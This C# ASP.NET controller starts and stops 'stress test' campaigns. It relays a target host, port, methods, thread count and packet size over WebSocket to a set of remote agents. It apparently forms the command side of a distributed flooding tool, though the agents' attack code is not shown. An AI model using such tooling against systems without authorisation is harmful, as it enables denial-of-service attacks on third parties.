using System.Text.Json;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using LibraNextgen.Common.Models;
using LibraNextgen.Common.Protocol;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Controllers;

[ApiController]
[Route("api/stress-test")]
[Authorize]
public class StressTestController : ControllerBase
{
    private readonly ConnectionManager _wsManager;
    private readonly StressTestService _stressService;

    public StressTestController(ConnectionManager wsManager, StressTestService stressService)
    {
        _wsManager = wsManager;
        _stressService = stressService;
    }

    [HttpPost("start")]
    public async Task<IActionResult> Start([FromBody] StressStartRequest req, CancellationToken ct)
    {
        var username = User.Identity?.Name ?? "unknown";
        var campaign = await _stressService.CreateAsync(req, username);

        var config = new StressConfig
        {
            CampaignId = campaign.Id,
            TargetHost = req.TargetHost,
            TargetPort = req.TargetPort,
            Methods = req.Methods,
            DurationSeconds = req.DurationSeconds,
            ThreadsPerAgent = req.ThreadsPerAgent,
            PacketSize = req.PacketSize
        };

        var configJson = JsonSerializer.Serialize(config);

        foreach (var agentId in req.AgentIds)
        {
            var msg = new WebSocketMessage
            {
                Type = WsMessageType.StressStart,
                Channel = agentId,
                Data = JsonSerializer.SerializeToElement(config)
            };

            try
            {
                await _wsManager.RelayToAgentAsync(agentId, msg, ct);
            }
            catch { /* agent may be offline */ }
        }

        return Ok(new { campaignId = campaign.Id, status = "started" });
    }

    [HttpPost("{id}/stop")]
    public async Task<IActionResult> Stop(string id, CancellationToken ct)
    {
        var campaign = _stressService.GetById(id);
        if (campaign == null)
            return NotFound(new { error = "Campaign not found" });

        _stressService.UpdateStatus(id, CampaignStatus.Stopped);

        foreach (var agentId in campaign.AgentIds)
        {
            var msg = new WebSocketMessage
            {
                Type = WsMessageType.StressStop,
                Channel = agentId
            };

            try { await _wsManager.RelayToAgentAsync(agentId, msg, ct); }
            catch { }
        }

        return Ok(new { campaignId = id, status = "stopped" });
    }

    [HttpGet("{id}")]
    public IActionResult GetById(string id)
    {
        var campaign = _stressService.GetById(id);
        if (campaign == null)
            return NotFound(new { error = "Campaign not found" });

        var agentStatuses = _stressService.GetAgentStatuses(id);

        return Ok(new { campaign, agentStatuses });
    }

    [HttpGet("history")]
    public IActionResult GetHistory([FromQuery] int page = 1, [FromQuery] int pageSize = 20)
    {
        var campaigns = _stressService.GetHistory(page, pageSize);
        return Ok(new { campaigns, page, pageSize });
    }
}
